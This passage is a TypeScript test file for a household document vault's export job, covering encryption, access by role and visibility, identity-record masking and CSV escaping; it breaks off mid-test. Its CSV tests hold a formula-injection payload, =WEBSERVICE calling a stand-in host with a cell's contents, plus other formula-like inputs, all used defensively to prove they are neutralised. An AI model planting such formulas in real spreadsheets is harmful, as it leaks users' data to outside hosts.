import { randomUUID } from 'node:crypto';
import { inflateRawSync } from 'node:zlib';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { Readable } from 'node:stream';
import { pipeline } from 'node:stream/promises';
import {
  deriveKey,
  EncryptStream,
  EnvKeyProvider,
  memberPhotoBinding,
  newKey,
  ScopeKeys,
  sealBytes,
  sealIdentity,
  sealPrivate,
  unwrapKey,
  wrapKey,
} from '@fdv/crypto';
import { createDb, createPool, withSystem, type Db } from '@fdv/db';
import type { IdentityFields } from '@fdv/shared';
import { createTestDatabase, testAdminUrl, type TestDatabase } from '@fdv/db/testing';
import { LocalAdapter } from '@fdv/storage';
import pg from 'pg';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { buildExport, csvCell, identityRecord } from './export.js';
import { decryptToBuffer } from './process-version.js';

const MASTER = 'worker-test-master-key-with-32-bytes-or-more';

/** Reads a ZIP without a library: central directory, then each entry inflated. */
function zipEntries(zip: Buffer): Map<string, Buffer> {
  const out = new Map<string, Buffer>();
  const eocd = zip.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]));
  let p = zip.readUInt32LE(eocd + 16);
  while (zip.readUInt32LE(p) === 0x02014b50) {
    const method = zip.readUInt16LE(p + 10);
    const compressed = zip.readUInt32LE(p + 20);
    const nameLen = zip.readUInt16LE(p + 28);
    const extraLen = zip.readUInt16LE(p + 30);
    const commentLen = zip.readUInt16LE(p + 32);
    const local = zip.readUInt32LE(p + 42);
    const name = zip.subarray(p + 46, p + 46 + nameLen).toString('utf8');
    const dataStart = local + 30 + zip.readUInt16LE(local + 26) + zip.readUInt16LE(local + 28);
    const data = zip.subarray(dataStart, dataStart + compressed);
    out.set(name, method === 8 ? inflateRawSync(data) : Buffer.from(data));
    p += 46 + nameLen + extraLen + commentLen;
  }
  return out;
}

describe("a person's identity details in an export (5.27)", () => {
  const parts = {
    shared: {
      given_name: 'Sara',
      ids: [{ id: 'p1', kind: 'passport' as const, number: 'P-1', document_id: 'doc-seen' }],
      custom: [{ id: 'c1', label: 'PIN', value: '1234', hidden: true }],
    },
    only_me: { notes: 'hers alone' },
  };
  const seen = (id: string) => id === 'doc-seen';

  it("somebody else's: the shared part as the app shows it, and never their Only me part", () => {
    expect(identityRecord({ id: 'sara', display_name: 'Sara' }, parts, 'me', seen)).toEqual({
      person: 'Sara',
      member_id: 'sara',
      shared: {
        fields: {
          given_name: 'Sara',
          ids: [{ id: 'p1', kind: 'passport', document_id: 'doc-seen' }],
          custom: [{ id: 'c1', label: 'PIN', hidden: true }],
        },
        masked: ['ids.p1', 'custom.c1'],
      },
    });
  });

  it("one's own: both parts, every value; a document the requester may not see is not named", () => {
    expect(
      identityRecord({ id: 'sara', display_name: 'Sara' }, parts, 'sara', () => false),
    ).toEqual({
      person: 'Sara',
      member_id: 'sara',
      shared: {
        fields: {
          given_name: 'Sara',
          ids: [{ id: 'p1', kind: 'passport', number: 'P-1' }],
          custom: [{ id: 'c1', label: 'PIN', value: '1234', hidden: true }],
        },
      },
      only_me: { fields: { notes: 'hers alone' } },
    });
    // Nothing to say: no record.
    expect(identityRecord({ id: 'x', display_name: 'X' }, { shared: {} }, 'me', seen)).toBeNull();
    expect(identityRecord({ id: 'x', display_name: 'X' }, undefined, 'me', seen)).toBeNull();
  });
});

describe('index.csv', () => {
  it('a cell a spreadsheet would run as a formula is written as text', () => {
    expect(csvCell('=WEBSERVICE("https://example.test/?"&A2)')).toBe(
      `"'=WEBSERVICE(""https://example.test/?""&A2)"`,
    );
    expect(csvCell('+44 20 7946 0000')).toBe("'+44 20 7946 0000");
    expect(csvCell('-1+1')).toBe("'-1+1");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\t=1')).toBe("'\t=1");
    expect(csvCell(['=1', 'tax'])).toBe("'=1 tax");
    // Everything else as it was.
    expect(csvCell('Barclays')).toBe('Barclays');
    expect(csvCell('Smith, Jones & Co')).toBe('"Smith, Jones & Co"');
    expect(csvCell('a\rb')).toBe('"a\rb"');
    expect(csvCell(3)).toBe('3');
    expect(csvCell(null)).toBe('');
  });
});

describe.skipIf(!testAdminUrl())('export.build job', () => {
  let tdb: TestDatabase;
  let db: Db;
  let admin: pg.Pool;
  let vaultDir: string;
  const hh = randomUUID();
  let ownerMember: string;
  let ownerAccount: string;
  let otherMember: string;
  const keys = new ScopeKeys(new EnvKeyProvider(MASTER));

  beforeAll(async () => {
    tdb = await createTestDatabase();
    db = createDb(createPool(tdb.appUrl, 3));
    admin = new pg.Pool({ connectionString: tdb.adminUrl, max: 1 });
    vaultDir = await mkdtemp(path.join(tmpdir(), 'fdv-export-vault-'));
    await admin.query('insert into household (id, name) values ($1, $2)', [hh, 'Export household']);
    ownerMember = (
      await admin.query<{ id: string }>(
        "insert into member (household_id, display_name) values ($1, 'Mansoor') returning id",
        [hh],
      )
    ).rows[0]?.id as string;
    otherMember = (
      await admin.query<{ id: string }>(
        "insert into member (household_id, display_name) values ($1, 'Sana') returning id",
        [hh],
      )
    ).rows[0]?.id as string;
    ownerAccount = (
      await admin.query<{ id: string }>(
        "insert into account (email) values ('o@x.test') returning id",
      )
    ).rows[0]?.id as string;
    await admin.query(
      "insert into account_household (account_id, household_id, member_id, role) values ($1, $2, $3, 'owner')",
      [ownerAccount, hh, ownerMember],
    );
    await withSystem(db, hh, async (trx) => {
      await keys.mintHouseholdKeys(trx, hh);
      await keys.mintMemberKey(trx, hh, ownerMember, null);
      await keys.mintMemberKey(trx, hh, otherMember, null);
      const v = await trx
        .insertInto('vault')
        .values({ household_id: hh, kind: 'local', label: 'test', status: 'ok' })
        .returning('id')
        .executeTakeFirstOrThrow();
      await trx
        .updateTable('household')
        .set({ active_vault_id: v.id })
        .where('id', '=', hh)
        .execute();
    });
  }, 60_000);
  afterAll(async () => {
    await db.destroy();
    await admin.end();
    await tdb.drop();
    await rm(vaultDir, { recursive: true, force: true });
  });

  async function addDoc(
    title: string,
    visibility: 'household' | 'adults' | 'private',
    owner: string,
    content: string,
    category = 'identity',
    details: { type_key?: string; extra?: Record<string, unknown>; notes?: string } = {},
  ) {
    return withSystem(db, hh, async (trx) => {
      const doc = await trx
        .insertInto('document')
        .values({
          household_id: hh,
          title,
          owner_member_id: owner,
          visibility,
          category,
          expires_on: '2031-03-31',
          expires_precision: 'month',
          identifier: 'ID-1',
          ...(details.type_key ? { type_key: details.type_key } : {}),
          ...(details.extra ? { extra: JSON.stringify(details.extra) } : {}),
          ...(details.notes ? { notes: details.notes } : {}),
        })
        .returning('id')
        .executeTakeFirstOrThrow();
      const scope = await keys.unwrap(
        trx,
        visibility === 'private'
          ? { householdId: hh, kind: 'member', memberId: owner }
          : { householdId: hh, kind: visibility },
      );
      // An Only me document's notes and details, sealed as 0.5.8 keeps them.
      if (visibility === 'private' && (details.notes || details.extra)) {
        await trx
          .updateTable('document')
          .set({
            ...sealPrivate(scope.key, doc.id, {
              notes: details.notes ?? null,
              extra: details.extra ?? {},
            }),
            notes: null,
            extra: '{}',
          })
          .where('id', '=', doc.id)
          .execute();
      }
      const fileKey = newKey();
      const key = `${hh}/${doc.id}/1/x.pdf.enc`;
      const enc = new EncryptStream(fileKey);
      const [put] = await Promise.all([
        new LocalAdapter(vaultDir).put(key, enc),
        pipeline(Readable.from([Buffer.from(content)]), enc),
      ]);
      const vault = await trx.selectFrom('vault').select('id').executeTakeFirstOrThrow();
      await trx
        .insertInto('document_version')
        .values({
          household_id: hh,
          document_id: doc.id,
          version_no: 1,
          filename: 'file.pdf',
          mime: 'application/pdf',
          byte_size: content.length,
          sha256: Buffer.alloc(32),
          cipher_bytes: put.bytes,
          cipher_sha256: Buffer.from(put.sha256, 'hex'),
          storage_key: key,
          vault_id: vault.id,
          file_key_wrapped: wrapKey(fileKey, scope.key, `version:${doc.id}`),
          wrapped_by_scope: scope.id,
        })
        .execute();
      return doc.id;
    });
  }

  it('builds a ZIP with originals by category and three indexes, honouring visibility', async () => {
    await addDoc("Mansoor's passport", 'household', ownerMember, 'PASSPORT BYTES');
    await addDoc('Home insurance', 'adults', ownerMember, 'POLICY BYTES', 'insurance');
    await addDoc('My private note', 'private', ownerMember, 'PRIVATE BYTES', 'legal');
    await addDoc("Sana's private note", 'private', otherMember, 'NOT FOR OWNER', 'legal');

    const exportId = await withSystem(db, hh, (trx) =>
      trx
        .insertInto('export')
        .values({ household_id: hh, requested_by: ownerAccount })
        .returning('id')
        .executeTakeFirstOrThrow(),
    ).then((r) => r.id);
    const log: Array<Record<string, unknown>> = [];
    await buildExport(
      {
        db,
        keys,
        credentialsKey: deriveKey(MASTER, 'vault-credentials'),
        localRoot: vaultDir,
        log: (level, msg, extra) => log.push({ level, msg, ...extra }),
      },
      { household_id: hh, export_id: exportId },
    );

    const row = await withSystem(db, hh, (trx) =>
      trx.selectFrom('export').selectAll().where('id', '=', exportId).executeTakeFirstOrThrow(),
    );
    expect(row.state).toBe('done');
    expect(row.document_count).toBe(3); // Sana's private note is not the owner's to export
    expect(row.storage_key).toBe(`${hh}/exports/${exportId}.zip.enc`);

    // The stored object is ciphertext, under the requester's own key (0.5.8);
    // decrypting it yields a real ZIP.
    const memberKey = await withSystem(db, hh, (trx) =>
      keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: ownerMember }),
    );
    const fileKey = unwrapKey(row.file_key_wrapped as Buffer, memberKey.key, `export:${exportId}`);
    const zip = await decryptToBuffer(
      new LocalAdapter(vaultDir),
      row.storage_key as string,
      fileKey,
    );
    expect(zip.subarray(0, 2).toString()).toBe('PK');
    expect(zip.length).toBe(Number(row.byte_size));

    const entries = zipEntries(zip);
    const names = [...entries.keys()].sort();
    expect(names).toEqual(
      [
        'README.txt',
        "identity/Mansoor's passport.pdf",
        'index.csv',
        'index.html',
        'index.json',
        'insurance/Home insurance.pdf',
        'legal/My private note.pdf',
      ].sort(),
    );
    const all = Buffer.concat([...entries.values()]);
    expect(all.includes(Buffer.from('NOT FOR OWNER'))).toBe(false);
    expect(entries.get('legal/My private note.pdf')?.toString()).toBe('PRIVATE BYTES');
    expect(entries.get("identity/Mansoor's passport.pdf")?.toString()).toBe('PASSPORT BYTES');
    // The indexes carry the facts a person would need without the app.
    const index = JSON.parse(entries.get('index.json')?.toString() ?? '{}') as {
      documents: Array<{ title: string; expires: string; person: string; file: string }>;
    };
    expect(index.documents.find((d) => d.title === "Mansoor's passport")).toMatchObject({
      expires: 'March 2031',
      person: 'Mansoor',
      file: "identity/Mansoor's passport.pdf",
    });
    expect(entries.get('index.csv')?.toString()).toContain(
      'Home insurance,,insurance,Mansoor,adults',
    );
    expect(entries.get('index.html')?.toString()).toContain('<td>March 2031</td>');
  }, 60_000);

  it('a document whose file was removed for good, or is not there, is listed without it; the export is made (5.24)', async () => {
    const removed = await addDoc('Restored without its file', 'household', ownerMember, 'GONE');
    const vanished = await addDoc('Removed as it was built', 'household', ownerMember, 'GONE TOO');
    const kept = await addDoc('Still has its file', 'household', ownerMember, 'STILL HERE');
    const keyOf = async (id: string) =>
      (
        await admin.query<{ storage_key: string }>(
          'select storage_key from document_version where document_id = $1',
          [id],
        )
      ).rows[0]?.storage_key as string;
    // A restore from before its removal marked it (restore.ts); the other's
    // object went as the export was made, with no mark.
    await new LocalAdapter(vaultDir).delete(await keyOf(removed));
    await admin.query(
      'update document_version set file_removed_at = now() where document_id = $1',
      [removed],
    );
    await new LocalAdapter(vaultDir).delete(await keyOf(vanished));

    const exportId = await withSystem(db, hh, (trx) =>
      trx
        .insertInto('export')
        .values({ household_id: hh, requested_by: ownerAccount })
        .returning('id')
        .executeTakeFirstOrThrow(),
    ).then((r) => r.id);
    await buildExport(
      {
        db,
        keys,
        credentialsKey: deriveKey(MASTER, 'vault-credentials'),
        localRoot: vaultDir,
        log: () => undefined,
      },
      { household_id: hh, export_id: exportId },
    );
    const row = await withSystem(db, hh, (trx) =>
      trx.selectFrom('export').selectAll().where('id', '=', exportId).executeTakeFirstOrThrow(),
    );
    expect(row.error).toBeNull();
    expect(row.state).toBe('done');
    const memberKey = await withSystem(db, hh, (trx) =>
      keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: ownerMember }),
    );
    const entries = zipEntries(
      await decryptToBuffer(
        new LocalAdapter(vaultDir),
        row.storage_key as string,
        unwrapKey(row.file_key_wrapped as Buffer, memberKey.key, `export:${exportId}`),
      ),
    );
    const index = JSON.parse(entries.get('index.json')?.toString() ?? '{}') as {
      documents: Array<{ document_id: string; file: string | null; file_note: string | null }>;
    };
    const of = (id: string) => index.documents.find((d) => d.document_id === id);
    expect(of(removed)).toMatchObject({ file: null, file_note: 'The file was removed for good.' });
    expect(of(vanished)).toMatchObject({
      file: null,
      file_note: 'The file was not where your files are kept when this was made.',
    });
    expect(of(kept)).toMatchObject({ file_note: null });
    expect(entries.get(of(kept)?.file as string)?.toString()).toBe('STILL HERE');
    const csvRow = entries
      .get('index.csv')
      ?.toString()
      .split('\n')
      .find((l) => l.startsWith('Restored without its file,'));
    expect(csvRow?.endsWith(',The file was removed for good.')).toBe(true);
    expect(entries.get('index.html')?.toString()).toContain(
      'Restored without its file<br><small>The file was removed for good.</small>',
    );
    // Taken out again, so the tests after this one see the vault as before.
    await admin.query('delete from document where id = any($1::uuid[])', [
      [removed, vanished, kept],
    ]);
  }, 60_000);

  it('detail columns are labelled and formula-guarded', async () => {
    // A type of the household's own, whose field somebody named like a formula.
    const own = 'h_abcdefghij';
    const field = 'h_klmnopqrst';
    await admin.query(
      `insert into document_type (key, label, category, household_id, fields)
       values ($1, 'Season ticket', 'other', $2, $3)`,
      [own, hh, JSON.stringify([{ key: field, label: '=HYPERLINK("x")', kind: 'text' }])],
    );
    await addDoc('Estate car', 'household', ownerMember, 'CAR BYTES', 'property', {
      type_key: 'vehicle_registration',
      extra: { vin: '=2+5', plate: 'AB12 CDE' },
    });
    await addDoc('Our wills', 'adults', ownerMember, 'WILL BYTES', 'legal', {
      type_key: 'will',
      extra: { last_reviewed: { date: '2026-03-31', precision: 'month' }, executor: '@Sana' },
    });
    await addDoc('Rail pass', 'household', ownerMember, 'PASS BYTES', 'other', {
      type_key: own,
      extra: { [field]: 'Annual', retired_key: true },
    });
    // Kept by a vault before 0.5.7, which took any key: one every object
    // inherits. Other documents have nothing under it, not the inherited one.
    await addDoc('Old receipt', 'household', ownerMember, 'RECEIPT BYTES', 'other', {
      type_key: 'warranty',
      extra: { constructor: 'legacy' },
    });
    // Not the requester's to export: its details are not either.
    await addDoc("Sana's car", 'private', otherMember, 'NOT FOR OWNER', 'property', {
      type_key: 'vehicle_registration',
      extra: { vin: 'SANASVIN0000001' },
    });

    const exportId = await withSystem(db, hh, (trx) =>
      trx
        .insertInto('export')
        .values({ household_id: hh, requested_by: ownerAccount })
        .returning('id')
        .executeTakeFirstOrThrow(),
    ).then((r) => r.id);
    await buildExport(
      {
        db,
        keys,
        credentialsKey: deriveKey(MASTER, 'vault-credentials'),
        localRoot: vaultDir,
        log: () => undefined,
      },
      { household_id: hh, export_id: exportId },
    );
    const row = await withSystem(db, hh, (trx) =>
      trx.selectFrom('export').selectAll().where('id', '=', exportId).executeTakeFirstOrThrow(),
    );
    expect(row.state).toBe('done');
    const memberKey = await withSystem(db, hh, (trx) =>
      keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: ownerMember }),
    );
    const zip = await decryptToBuffer(
      new LocalAdapter(vaultDir),
      row.storage_key as string,
      unwrapKey(row.file_key_wrapped as Buffer, memberKey.key, `export:${exportId}`),
    );
    const entries = zipEntries(zip);

    // index.csv: a column for each detail, named as its type names it, and
    // a name or a value a spreadsheet would run as a formula is written as text.
    const [header = '', ...lines] = (entries.get('index.csv')?.toString() ?? '').split('\n');
    const cols = header.split(',');
    expect(cols.slice(0, 12)).toEqual([
      'title',
      'type_key',
      'category',
      'person',
      'visibility',
      'issued_by',
      'issued',
      'expires',
      'identifier',
      'physical_location',
      'tags',
      'notes',
    ]);
    expect(cols).toEqual(
      expect.arrayContaining([
        'VIN',
        'Registration plate',
        'Executor',
        'Last reviewed',
        `"'=HYPERLINK(""x"")"`,
        'retired_key',
      ]),
    );
    expect(cols.slice(-5)).toEqual(['file', 'version_no', 'sha256', 'document_id', 'file_note']);
    const cell = (title: string, column: string) =>
      lines.find((l) => l.startsWith(`${title},`))?.split(',')[cols.indexOf(column)];
    expect(cell('Estate car', 'VIN')).toBe("'=2+5");
    expect(cell('Estate car', 'Registration plate')).toBe('AB12 CDE');
    expect(cell('Our wills', 'Executor')).toBe("'@Sana");
    expect(cell('Our wills', 'Last reviewed')).toBe('March 2026');
    expect(cell('Rail pass', `"'=HYPERLINK(""x"")"`)).toBe('Annual');
    expect(cell('Rail pass', 'retired_key')).toBe('Yes');
    expect(cell('Estate car', 'Executor')).toBe('');
    // The old receipt's detail, and nothing inherited for anybody else's.
    expect(cell('Old receipt', 'constructor')).toBe('legacy');
    expect(cell('Estate car', 'constructor')).toBe('');
    expect(entries.get('index.csv')?.toString()).not.toContain('undefined');

    // index.json keeps the details as the vault does, with what each is called.
    const index = JSON.parse(entries.get('index.json')?.toString() ?? '{}') as {
      details: Array<{ key: string; label: string }>;
      documents: Array<{ title: string; extra: Record<string, unknown> }>;
    };
    expect(index.details).toEqual(
      expect.arrayContaining([
        { key: 'vin', label: 'VIN' },
        { key: 'plate', label: 'Registration plate' },
        { key: field, label: '=HYPERLINK("x")' },
      ]),
    );
    expect(index.documents.find((d) => d.title === 'Our wills')?.extra).toEqual({
      last_reviewed: { date: '2026-03-31', precision: 'month' },
      executor: '@Sana',
    });
    // index.html lists them, escaped.
    const page = entries.get('index.html')?.toString() ?? '';
    expect(page).toContain('VIN: =2+5<br>Registration plate: AB12 CDE');
    expect(page).toContain('=HYPERLINK(&quot;x&quot;): Annual');
    expect(page.split('constructor: ')).toHaveLength(2);
    // Somebody else's Only me car is in none of it.
    expect(Buffer.concat([...entries.values()]).includes(Buffer.from('SANASVIN'))).toBe(false);
  }, 60_000);

  /** An export for an account, built, and opened with the key it says it is under. */
  async function exported(account: string) {
    const exportId = await withSystem(db, hh, (trx) =>
      trx
        .insertInto('export')
        .values({ household_id: hh, requested_by: account })
        .returning('id')
        .executeTakeFirstOrThrow(),
    ).then((r) => r.id);
    await buildExport(
      {
        db,
        keys,
        credentialsKey: deriveKey(MASTER, 'vault-credentials'),
        localRoot: vaultDir,
        log: () => undefined,
      },
      { household_id: hh, export_id: exportId },
    );
    const row = await withSystem(db, hh, (trx) =>
      trx.selectFrom('export').selectAll().where('id', '=', exportId).executeTakeFirstOrThrow(),
    );
    expect(row.state).toBe('done');
    const zip = await withSystem(db, hh, async (trx) =>
      decryptToBuffer(
        new LocalAdapter(vaultDir),
        row.storage_key as string,
        unwrapKey(
          row.file_key_wrapped as Buffer,
          await keys.unwrapById(trx, row.wrapped_by_scope as string),
          `export:${exportId}`,
        ),
      ),
    );
    const entries = zipEntries(zip);
    const index = JSON.parse(entries.get('index.json')?.toString() ?? '{}') as {
      documents: Array<{ title: string; notes: string | null; extra: Record<string, unknown> }>;
    };
    return { exportId, row, entries, index, all: Buffer.concat([...entries.values()]) };
  }

  it('sealed notes are opened only for their owner', async () => {
    // Sana signs in too, and asks for an export of her own.
    const sanaAccount = (
      await admin.query<{ id: string }>(
        "insert into account (email) values ('s@x.test') returning id",
      )
    ).rows[0]?.id as string;
    await admin.query(
      "insert into account_household (account_id, household_id, member_id, role) values ($1, $2, $3, 'adult')",
      [sanaAccount, hh, otherMember],
    );
    await addDoc('My sealed will', 'private', ownerMember, 'MY WILL', 'legal', {
      type_key: 'will',
      notes: 'The original is with the solicitor',
      extra: { executor: 'Rahul' },
    });
    await addDoc('Her sealed diary', 'private', otherMember, 'HER DIARY', 'legal', {
      notes: 'Sana keeps this to herself',
    });
    await addDoc('Family recipes', 'household', ownerMember, 'RECIPES', 'other', {
      notes: 'Gran wrote these',
    });

    // Mine, opened for me; hers nowhere, sealed or not.
    const mine = await exported(ownerAccount);
    expect(mine.index.documents.find((d) => d.title === 'My sealed will')).toMatchObject({
      notes: 'The original is with the solicitor',
      extra: { executor: 'Rahul' },
    });
    expect(mine.index.documents.find((d) => d.title === 'Family recipes')?.notes).toBe(
      'Gran wrote these',
    );
    expect(mine.entries.get('index.csv')?.toString()).toContain(
      'The original is with the solicitor',
    );
    expect(mine.all.includes(Buffer.from('Sana keeps'))).toBe(false);

    // Hers, opened for her; mine nowhere.
    const hers = await exported(sanaAccount);
    expect(hers.index.documents.find((d) => d.title === 'Her sealed diary')?.notes).toBe(
      'Sana keeps this to herself',
    );
    expect(hers.index.documents.find((d) => d.title === 'Family recipes')?.notes).toBe(
      'Gran wrote these',
    );
    expect(hers.all.includes(Buffer.from('solicitor'))).toBe(false);
    expect(hers.index.documents.map((d) => d.title)).not.toContain('My sealed will');
  }, 60_000);

  it('an export containing an Only me document cannot be unwrapped with the household key', async () => {
    const mine = await exported(ownerAccount);
    expect(mine.index.documents.map((d) => d.title)).toContain('My private note');
    const [hhKey, memberKey] = await withSystem(db, hh, (trx) =>
      Promise.all([
        keys.unwrap(trx, { householdId: hh, kind: 'household' }),
        keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: ownerMember }),
      ]),
    );
    // Wrapped under the requester's own key, and said to be.
    expect(mine.row.wrapped_by_scope).toBe(memberKey.id);
    const wrapped = mine.row.file_key_wrapped as Buffer;
    expect(() => unwrapKey(wrapped, hhKey.key, `export:${mine.exportId}`)).toThrow(/cannot unwrap/);
    expect(unwrapKey(wrapped, memberKey.key, `export:${mine.exportId}`)).toHaveLength(32);
    // Nor with the other adult's.
    const hers = await withSystem(db, hh, (trx) =>
      keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: otherMember }),
    );
    expect(() => unwrapKey(wrapped, hers.key, `export:${mine.exportId}`)).toThrow(/cannot unwrap/);
  }, 60_000);

  it("a household's identity key and both parts of a record: the requester's own comes whole (5.26, 5.27)", async () => {
    // The identity scope key, minted as the API mints it, and a shared and
    // an Only me part sealed under their keys.
    await putIdentity(ownerMember, {
      shared: { ids: [{ id: 'p1', kind: 'passport', number: 'EXPORT-ID-SHARED-1' }] },
      only_me: { ids: [{ id: 'p2', kind: 'passport', number: 'EXPORT-ID-ONLYME-2' }] },
    });
    const kinds = await withSystem(db, hh, (trx) =>
      trx.selectFrom('scope_key').select('kind').execute(),
    );
    expect(kinds.map((k) => k.kind)).toContain('identity');
    // Built, under the requester's own key, with the documents as before,
    // and their own record, both parts, every number in it.
    const mine = await exported(ownerAccount);
    expect(mine.index.documents.map((d) => d.title)).toContain('My private note');
    expect(mine.all.includes(Buffer.from('EXPORT-ID-SHARED-1'))).toBe(true);
    expect(mine.all.includes(Buffer.from('EXPORT-ID-ONLYME-2'))).toBe(true);
    const record = JSON.parse(mine.entries.get('identity/Mansoor.json')?.toString() ?? '{}') as {
      shared: { fields: IdentityFields; masked?: string[] };
      only_me: { fields: IdentityFields };
    };
    expect(record.shared).toEqual({
      fields: { ids: [{ id: 'p1', kind: 'passport', number: 'EXPORT-ID-SHARED-1' }] },
    });
    expect(record.only_me.fields.ids?.[0]?.number).toBe('EXPORT-ID-ONLYME-2');
    // And a section of index.html, each field by its name, Only me said so.
    await putIdentity(ownerMember, {
      shared: {
        emails: [{ id: 'e1', label: 'Home', value: 'm@x.test' }],
        addresses: [{ id: 'a1', line1: '12 Orchard Lane', city: 'Reading', country: 'GB' }],
        ids: [{ id: 'p1', kind: 'passport', number: 'EXPORT-ID-SHARED-1', issuer: 'UK' }],
      },
      only_me: { notes: 'Mine & <only> mine' },
    });
    const page = (await exported(ownerAccount)).entries.get('index.html')?.toString() ?? '';
    expect(page).toContain('<h2>Identity details</h2>');
    expect(page).toContain('<h3>Mansoor (you)</h3>');
    expect(page).toContain('<th scope="row">Home email</th><td>m@x.test</td>');
    expect(page).toContain(
      '<th scope="row">Address</th><td>12 Orchard Lane<br>Reading<br>United Kingdom</td>',
    );
    expect(page).toContain(
      '<th scope="row">Passport</th><td>EXPORT-ID-SHARED-1<br>Issued by UK</td>',
    );
    expect(page).toContain(
      '<th scope="row">Notes <small>(Only me)</small></th><td>Mine &amp; &lt;only&gt; mine</td>',
    );
    // Nobody else's record here: nothing said about what is left out of them.
    expect(page).not.toContain('are not in this export');
  }, 60_000);

  /** Somebody new, with a sign-in of this role when given one, and their own member key. */
  async function person(name: string, role: 'owner' | 'adult' | 'teen' | 'viewer' | null) {
    const id = (
      await admin.query<{ id: string }>(
        'insert into member (household_id, display_name) values ($1, $2) returning id',
        [hh, name],
      )
    ).rows[0]?.id as string;
    await withSystem(db, hh, (trx) => keys.mintMemberKey(trx, hh, id, null));
    if (!role) return { id, account: null };
    const account = (
      await admin.query<{ id: string }>('insert into account (email) values ($1) returning id', [
        `${randomUUID()}@x.test`,
      ])
    ).rows[0]?.id as string;
    await admin.query(
      'insert into account_household (account_id, household_id, member_id, role) values ($1, $2, $3, $4)',
      [account, hh, id, role],
    );
    return { id, account };
  }

  /** A person's identity details, sealed as the API seals them; what was there goes. */
  async function putIdentity(
    member: string,
    parts: Partial<Record<'shared' | 'only_me', IdentityFields>>,
  ) {
    await admin.query('delete from member_identity where member_id = $1', [member]);
    await withSystem(db, hh, async (trx) => {
      for (const [part, fields] of Object.entries(parts) as Array<
        ['shared' | 'only_me', IdentityFields]
      >) {
        const key =
          part === 'shared'
            ? await keys.identityKey(trx, hh)
            : await keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: member });
        await trx
          .insertInto('member_identity')
          .values({
            household_id: hh,
            member_id: member,
            part,
            ...sealIdentity(key.key, { householdId: hh, memberId: member, part }, fields),
            wrapped_by_scope: key.id,
          })
          .execute();
      }
    });
  }

  /** A person's photo, made and sealed as the worker makes it (5.17c). */
  async function putPhoto(member: string, jpeg: Buffer) {
    const id = randomUUID();
    await withSystem(db, hh, async (trx) => {
      const scope = await keys.unwrap(trx, { householdId: hh, kind: 'household' });
      await trx
        .insertInto('member_photo')
        .values({
          id,
          household_id: hh,
          member_id: member,
          state: 'ready',
          sealed: sealBytes(scope.key, jpeg, memberPhotoBinding(hh, member, id)),
          ready_at: new Date(),
        })
        .execute();
    });
  }

  type Index = {
    people: Array<{ id: string; name: string; photo: string | null; identity: string | null }>;
  };
  const identityFiles = (x: Awaited<ReturnType<typeof exported>>) =>
    [...x.entries.keys()].filter((n) => n.startsWith('identity/') && n.endsWith('.json')).sort();

  it('only the records the requester may read: each role, each audience, and Only me only in the person’s own', async () => {
    await admin.query('delete from member_identity');
    const owner = { id: ownerMember, account: ownerAccount };
    const adult = await person('Tariq', 'adult');
    const teen = await person('Tess', 'teen');
    const viewer = await person('Vik', 'viewer');
    const kid = await person('Kid', null);
    await putIdentity(owner.id, {
      shared: {
        given_name: 'Mansoor',
        ids: [{ id: 'o1', kind: 'passport', number: 'OWNER-PASS-1', document_id: randomUUID() }],
      },
      only_me: { notes: 'OWNER-ONLY-ME' },
    });
    await putIdentity(adult.id, {
      shared: {
        given_name: 'Tariq',
        custom: [{ id: 'c1', label: 'Gym PIN', value: 'ADULT-HIDDEN-7', hidden: true }],
      },
      only_me: { ids: [{ id: 't1', kind: 'tax_id', number: 'ADULT-ONLY-ME-TAX' }] },
    });
    await putIdentity(teen.id, { shared: { given_name: 'Tess', place_of_birth: 'TEEN-PLACE' } });
    await putIdentity(viewer.id, { shared: { given_name: 'Vik', job_title: 'VIEWER-JOB' } });
    await putIdentity(kid.id, {
      shared: { given_name: 'Kid', ids: [{ id: 'k1', kind: 'passport', number: 'KID-PASS-3' }] },
    });
    const everyone = ['Kid', 'Mansoor', 'Tariq', 'Tess', 'Vik'];
    const file = (name: string) => `identity/${name}.json`;
    // Whose records each reads (canSeeIdentity): their own, always; the
    // owners, everybody's; adults from `adults`; teens from `family`;
    // viewers never anybody else's.
    const expected: Record<string, Record<string, string[]>> = {
      owners_and_self: {
        owner: everyone,
        adult: ['Tariq'],
        teen: ['Tess'],
        viewer: ['Vik'],
      },
      adults: { owner: everyone, adult: everyone, teen: ['Tess'], viewer: ['Vik'] },
      family: { owner: everyone, adult: everyone, teen: everyone, viewer: ['Vik'] },
    };
    const accounts = { owner, adult, teen, viewer };
    // Each person's own secrets: in their export, and in nobody else's.
    const secrets: Record<string, string[]> = {
      owner: ['OWNER-ONLY-ME', 'OWNER-PASS-1'],
      adult: ['ADULT-ONLY-ME-TAX', 'ADULT-HIDDEN-7'],
      teen: [],
      viewer: [],
    };
    try {
      for (const audience of ['owners_and_self', 'adults', 'family'] as const) {
        // The operator's own connection, which the audience's guard does not ask.
        await admin.query('update household set identity_audience = $1 where id = $2', [
          audience,
          hh,
        ]);
        for (const role of ['owner', 'adult', 'teen', 'viewer'] as const) {
          const x = await exported(accounts[role].account as string);
          const want = expected[audience]?.[role] ?? [];
          expect(identityFiles(x), `${audience}/${role}`).toEqual(want.map(file).sort());
          const index = x.index as unknown as Index;
          expect(
            index.people.filter((p) => p.identity).map((p) => p.name),
            `${audience}/${role}`,
          ).toEqual(want);
          for (const [whose, words] of Object.entries(secrets)) {
            for (const w of words) {
              expect(x.all.includes(Buffer.from(w)), `${audience}/${role}: ${w}`).toBe(
                whose === role,
              );
            }
          }
          // A child with no sign-in is nobody's own: their number is masked
          // in every export that has their record.
          expect(x.all.includes(Buffer.from('KID-PASS-3')), `${audience}/${role}`).toBe(false);
          if (want.includes('Kid')) {
            const kids = JSON.parse(x.entries.get(file('Kid'))?.toString() ?? '{}') as {
              shared: { fields: IdentityFields; masked: string[] };
              only_me?: unknown;
            };
            expect(kids.shared).toEqual({
              fields: { given_name: 'Kid', ids: [{ id: 'k1', kind: 'passport' }] },
              masked: ['ids.k1'],
            });
